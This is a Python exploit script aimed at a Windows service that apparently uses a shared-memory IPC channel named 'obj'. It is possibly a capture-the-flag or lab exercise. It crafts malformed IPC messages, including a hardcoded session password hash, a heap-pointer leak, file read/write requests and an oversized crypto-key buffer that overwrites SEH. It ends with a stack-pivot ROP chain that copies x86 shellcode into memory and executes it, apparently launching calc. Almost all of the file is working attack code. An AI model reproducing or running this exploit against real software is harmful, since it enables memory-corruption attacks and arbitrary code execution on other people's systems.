import struct
import ctypes
from ctypes import *
import sys
import time
import mmap
"""
def createData():
	data = [
		"A"*1000
	]
	return "".join(data)
"""
def checkObj():
	_CreateFileMapping = ctypes.windll.kernel32.CreateFileMappingW
	_GetLastError = ctypes.windll.kernel32.GetLastError
	INVALID_HANDLE_VALUE = -1
	PAGE_READWRITE = 0x4
	ERROR_ALREADY_EXISTS = 0xb7
	h = _CreateFileMapping(INVALID_HANDLE_VALUE, 0, PAGE_READWRITE, 0, 4096, ctypes.c_wchar_p("obj"))
	return (h != INVALID_HANDLE_VALUE) and (_GetLastError() == ERROR_ALREADY_EXISTS)
	
def createObj(type, function, sequence, argc, raw):
	"""
	typdef struct _SerializedIPC {
		uint32_t type;
		uint32_t function;
		uint32_t sequence;
		uint8_t argc;
		IPCArgs args[IPC_ARGS_SIZE];
		uint8_t raw[RAW_SIZE];
	}
	
	typedef struct _IPCArgs{
		union {
			uint8_t buf[IPC_ARGS_BUF_SZ];
			uint8_t uchar;
			uint16_t ushort;
			uint32_t uint;
			uint64_t ulong;
			double dbl;
			void *ptr;
		} u;
		uint32_t tag;
	} IPCArgs;
	
	"""
	#define RAW_SIZE 32768
	#define IPC_ARGS_SIZE 16
	#define IPC_ARGS_BUF_SZ 512
	#Auth 0x8, 0xf017, 0x1, 0x2, args
	
	"""
	typedef struct _Record{
		uint32_t index;
		uint8_t info;
		uint8_t err_code[16];
	}
	
	
	"""
	
	
	
def validateSession():
	"""
	hMapObject = windll.kernel32.OpenFileMappingA(
		0xf001f,
		0,
		c_char_p("obj")
	)
	if(hMapObject == 0):
		print "Could not open Mapping"
		sys.exit(-1)
	buffer = "B"*1000
	buffer_ptr = id(buffer)+20
	buffer_len = len(buffer)
	dwReturn = c_ulong()
	windll.kernel32.WriteFile(hMapObject, buffer_ptr, buffer_len, byref(dwReturn), None)
	windll.kernel32.CloseHandle(hMapObject)
	"""
	mpassword = "c5a514664b81f21235d2d1e7e6454334abc3cf4b"
	
	length = 0xa090
	shmem = mmap.mmap(0,length,"obj", mmap.ACCESS_WRITE)
	data = struct.pack("<L",0x8)
	data += struct.pack("<L",0xf017)
	data += struct.pack("<L",0x1)
	#data += (0x210-len(data))*"C"
	s = len(data)
	data += struct.pack("<L",0xf)
	data += struct.pack("<L",len(mpassword))
	for x in xrange(0,127):
		data += struct.pack("<L",0x43434343+x)
	data += struct.pack("<L",0x4)
	s = len(data)
	#1 4 6 6 4 b 8 1 f 2 1 2 3 5
	data += "XXXX"
	data += "c5a5"
	data += "1466"
	data += "4b81"
	data += "f212"
	data += "35d2"
	data += "d1e7e"
	data += "6454"
	data += "334a"
	data += "bc3c"
	data += "f4b"
	data += "\x00\x00\x00\x00"
	for x in xrange(0,117):
		data += struct.pack("<L",0x44444444+x)
	#data += (0x418-len(data))*"D"
	data += struct.pack("<L",0x1)
	
	
	shmem.write(data)
	shmem.close()
def getData():
	"""
	hMapObject = windll.kernel32.OpenFileMappingA(
		0xf001f,
		0,
		c_char_p("obj")
	)
	if(hMapObject == 0):
		print "Could not Open Mapping"
		sys.exit(-1)
		
	pBuf = windll.kernel32.MapViewOfFile(
		hMapObject,
		0xf001f,
		0,
		0,
		0
	)
	if (pBuf == 0):
		print "Could not map view of file"
		sys.exit(-1)
		
	pBuf_str = cast(pBuf, c_char_p)
	print pBuf_str.value
	
	windll.kernel32.UnmapViewOfFile(pBuf)
	windll.kernel32.CloseHandle(hMapObject)
	"""
	
	shmem = mmap.mmap(0,0xa090, "obj", mmap.ACCESS_READ)
	#print dir(shmem)
	data = (shmem.read(0xa090))
	print len(data)
	print map(lambda x: hex(ord(x)) ,data.replace("\x00",""))
	print hex(struct.unpack("<L", data[0:4])[0])
	print hex(struct.unpack("<L", data[4:8])[0])
	
	shmem.close()
	return data
	
def blobSetup():
	length = 0xa090
	shmem = mmap.mmap(0,length,"obj", mmap.ACCESS_WRITE)
	data = ""
	data += struct.pack("<L",0x4) #IPC_VALIDATE_BLOB
	data += struct.pack("<L",0xf00e) #VALIDATE_BLOB
	data += struct.pack("<L", 0x0) #sequence
	data += struct.pack("<L", 0x2) #argc
	data += struct.pack("<L", 0x5) #index
	data += "\x00"*(512-4) #Pad
	data += struct.pack("<L", 0x5) #tag == IPC_ULONG
	data += "B"*512
	data += struct.pack("<L", 0x1)
	data += struct.pack("<L", 0x1)
	data += struct.pack("<L", 0x20)
	for x in xrange(0, 32768/4):
		data += struct.pack("<L",0x43434343+x)
	shmem.write(data)
	shmem.close()
	
def setCryptoKey():
	length = 0xa090
	shmem = mmap.mmap(0,length,"obj",mmap.ACCESS_WRITE)
	data = ""
	data += struct.pack("<L",0x3) #IPC_CRYPTO
	data += struct.pack("<L",0xf00a) #function
	data += struct.pack("<L", 0x0) #sequence 
	data += struct.pack("<L", 0x2) #argc
	data += "Z"*260 #name
	data += "\x00"*(512-260)
	data += struct.pack("<L",0x8) #IPC_BUF
	data += struct.pack("<L", 4096) #Size
	data += struct.pack("<L", 4096)
	data += "\x00"*(512-8)
	data += struct.pack("<L", 0x3)
	data += struct.pack("<L", 0x4)
	shmem.write(data)
	shmem.close()
	
def getCryptoKey():
	length = 0xa090
	shmem = mmap.mmap(0,length,"obj",mmap.ACCESS_WRITE)
	data = ""
	data += struct.pack("<L",0x3) #IPC_CRYPTO
	data += struct.pack("<L",0xf00b) #function
	data += struct.pack("<L", 0x0) #sequence 
	data += struct.pack("<L", 0x2) #argc
	data += "Z"*260 #name
	data += "\x00"*(512-260)
	data += struct.pack("<L",0x8) #IPC_BUF
	data += struct.pack("<L", 4096) #Size
	data += struct.pack("<L", 4096)
	data += "\x00"*(512-8)
	data += struct.pack("<L", 0x3)
	data += struct.pack("<L", 0x4)
	shmem.write(data)
	shmem.close()
	
def crypto_set_key():
	#SEH overwrite, 
	length = 0xa090
	payload = ""
	
	#SEH overwrite, 41415137
	for x in xrange(0,4114):	
		payload += struct.pack("<L", 0x41414141+x)
		
	#2200, stack cookie check and failed
	"""
	for x in xrange(0,2176):	
		payload += struct.pack("<L", 0x41414141+x)
	"""
	len_payload = len(payload)
	data = ""
	data += struct.pack("<L", 0x3) # IPC_CRYPTO
	data += struct.pack("<L", 0xf00a) #function, CRYPTO_SET_KEY
	data += struct.pack("<L", 0x0) #Sequence
	data += struct.pack("<L", 0x2) #argc
	data += "\x00"*512
	data += struct.pack("<L", 0x8) #IPC_RAW, argv[0]
	data += struct.pack("<L", len_payload) #Size
	data += struct.pack("<L", len_payload)
	data += "\x00"*(512-8)
	data += struct.pack("<L", 0x4) #IPC_UINT
	data += struct.pack("<L", 0x4)
	data += payload
	#data += "BBBB"*7288
	print len(data)
	shmem = mmap.mmap(0, len(data), "obj" ,mmap.ACCESS_WRITE)
	shmem.write(data)
	shmem.close()
	
def ropPayload():
	"""
	0046222c : add esp, 0x2204; ret
	450093: pop eax; ret
	473329: pop edx; ret
	4b8ce6: mov [edx], eax; ret
	48bc4a: jmp eax
	"""
	shellcode = "\x31\xdb\x64\x8b\x7b\x30\x8b\x7f\x0c\x8b\x7f\x1c\x8b\x47\x08\x8b\x77\x20\x8b\x3f\x80\x7e\x0c\x33\x75\xf2\x89\xc7\x03\x78\x3c\x8b\x57\x78\x01\xc2\x8b\x7a\x20\x01\xc7\x89\xdd\x8b\x34\xaf\x01\xc6\x45\x81\x3e\x43\x72\x65\x61\x75\xf2\x81\x7e\x08\x6f\x63\x65\x73\x75\xe9\x8b\x7a\x24\x01\xc7\x66\x8b\x2c\x6f\x8b\x7a\x1c\x01\xc7\x8b\x7c\xaf\xfc\x01\xc7\x89\xd9\xb1\xff\x53\xe2\xfd\x68\x63\x61\x6c\x63\x89\xe2\x52\x52\x53\x53\x53\x53\x53\x53\x52\x53\xff\xd7"
	print len(shellcode)
	length = 0xa090
	payload_length = 4114*4
	payload = "A"*payload_length
	#pivot = struct.pack("<L",0x44444444)
	pivot = struct.pack("<L", 0x0046222c)
	ropchain = []
	target_addr = 0x401000
	for i in xrange(0, len(shellcode), 4):
		ropchain += struct.pack("<L", 0x450092)
		ropchain += shellcode[i:i+4]
		ropchain += struct.pack("<L", 0x473329)
		ropchain += struct.pack("<L", target_addr+i)
		ropchain += struct.pack("<L", 0x4b8ce6)
		pass
	ropchain += struct.pack("<L", 0x450092) #pop eax, ret
	ropchain += struct.pack("<L", 0x401000) #addr
	ropchain += struct.pack("<L", 0x48bc4a) #jmp eax
	ropchain = "".join(ropchain)
	print len(ropchain)
	payload = "A"*(14588-4) + ropchain + "B"*(1756+4-len(ropchain)) + pivot + "C"*108
	len_payload = len(payload)
	print len_payload
	data = ""
	data += struct.pack("<L", 0x3) # IPC_CRYPTO
	data += struct.pack("<L", 0xf00a) #function, CRYPTO_SET_KEY
	data += struct.pack("<L", 0x0) #Sequence
	data += struct.pack("<L", 0x2) #argc
	data += "\x00"*512
	data += struct.pack("<L", 0x8) #IPC_RAW, argv[0]
	data += struct.pack("<L", len_payload) #Size
	data += struct.pack("<L", len_payload)
	data += "\x00"*(512-8)
	data += struct.pack("<L", 0x4) #IPC_UINT
	data += struct.pack("<L", 0x4)
	data += payload
	#data += "BBBB"*7288
	print len(data)
	shmem = mmap.mmap(0, len(data), "obj" ,mmap.ACCESS_WRITE)
	shmem.write(data)
	shmem.close()
	

def ping():
	length = 0xa090
	shmem = mmap.mmap(0, length, "obj" ,mmap.ACCESS_WRITE)
	data = ""
	data += struct.pack("<L", 0x5) #IPC_PING
	shmem.write(data)
	shmem.close()
	pass
	
def get_heap_leak():
	data = getData()
	leak = struct.unpack("<L", data[8:12])[0]
	print "heap_leak:%s"%hex(leak)
	heap_ptr = leak-0x5bee0
	print "heap_top:%s"%hex(heap_ptr)
	return heap_ptr
	
def readFile():
	length = 0xa090
	shmem = mmap.mmap(0,length,"obj", mmap.ACCESS_WRITE)
	data = ""
	data += struct.pack("<L", 0x2) #FILE_IO
	data += struct.pack("<L", 0xf005) #FILEIO_READ
	data += struct.pack("<L", 0x0) #sequence
	data += struct.pack("<L", 0x3) #argc
	data += "test"+"\x00"*(512-4)
	data += struct.pack("<L", 0x1) #IPC_BUF
	data += struct.pack("<L", 0x0) #PAD
	data += struct.pack("<L", 32000) #offset
	data += "\x00"*(512-8)
	data += struct.pack("<L", 0x4) #IPC_UINT
	data += struct.pack("<L", 0x4)
	data += struct.pack("<L", 32000) #size
	data += struct.pack("<L", 32000) #size
	data += "\x00"*(512-12)
	data += struct.pack("<L", 0x4) #IPC_UINT
	data += struct.pack("<L", 0x4)
	data += struct.pack("<L", 0x4)
	shmem.write(data)
	shmem.close()
	pass
	
def writeFile():
	length = 0xa090
	shmem = mmap.mmap(0,length,"obj", mmap.ACCESS_WRITE)
	data = ""
	data += struct.pack("<L", 0x2) #FILE_IO
	data += struct.pack("<L", 0xf006) #FILEIO_READ
	data += struct.pack("<L", 0x0) #sequence
	data += struct.pack("<L", 0x4) #argc
	data += "test"+"\x00"*(512-4)
	data += struct.pack("<L", 0x1) #IPC_BUF
	data += struct.pack("<L", 0x0) #PAD
	data += struct.pack("<L", 32000) #offset
	data += "Z"*(512-8)
	data += struct.pack("<L", 0x1) #IPC_UINT
	data += struct.pack("<L", 0x1)
	data += struct.pack("<L", 512) #offset
	data += struct.pack("<L", 512) #offset
	data += struct.pack("<L", 0x4) * ((512-8)/4)
	data += struct.pack("<L", 0x4) #IPC_UINT
	data += struct.pack("<L", 0x4)
	data += struct.pack("<L", 0x4)
	data += struct.pack("<L", 512) #size
	data += struct.pack("<L", 512) #size
	data += struct.pack("<L", 0x4) * ((512-8)/4)
	data += struct.pack("<L", 0x4) #IPC_UINT
	data += struct.pack("<L", 0x4)
	data += struct.pack("<L", 0x4) * 100
	shmem.write(data)
	shmem.close()
	
	
def main():
	if sys.argv[1] == "v":
		validateSession()
		time.sleep(2.0)
		getData()
	elif sys.argv[1] == "b":
		blobSetup()
		time.sleep(2.0)
		getData()
	elif sys.argv[1] == "set_key":
		setCryptoKey()
		time.sleep(2.0)
	elif sys.argv[1] == "get_key":
		getCryptoKey()
	elif sys.argv[1] == "dump_data":
		getData()
	elif sys.argv[1] == "crypto_set_key":
		crypto_set_key()
	elif sys.argv[1] == "ping":
		ping()
	elif sys.argv[1] == "get_heap_leak":
		get_heap_leak()
	elif sys.argv[1] == "read_file":
		readFile()
	elif sys.argv[1] == "write_file":
		writeFile()
	elif sys.argv[1] == "rop":
		ropPayload()
		
		

		
main()
